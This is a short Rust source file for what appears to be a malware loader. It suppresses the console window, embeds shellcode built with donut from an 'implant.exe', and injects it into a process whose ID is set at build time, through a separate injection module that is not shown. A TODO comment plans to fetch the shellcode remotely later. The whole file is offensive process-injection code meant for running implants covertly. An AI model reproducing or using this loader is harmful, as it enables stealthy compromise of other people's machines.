// Don't flash up the console window when this code runs
#![windows_subsystem = "windows"]

mod injection;

const PID: &str = env!("GUAC_PROC");

fn main() {
    // Generate the shellcode with `donut implant.exe`
    // TODO: Actually download the shellcode instead of including it
    let shellcode = include_bytes!("shellcode.bin");

    // TODO: Don't unwrap, this is just for debugging.
    let pid = PID.parse().unwrap();
    injection::inject(pid, shellcode).unwrap();
}
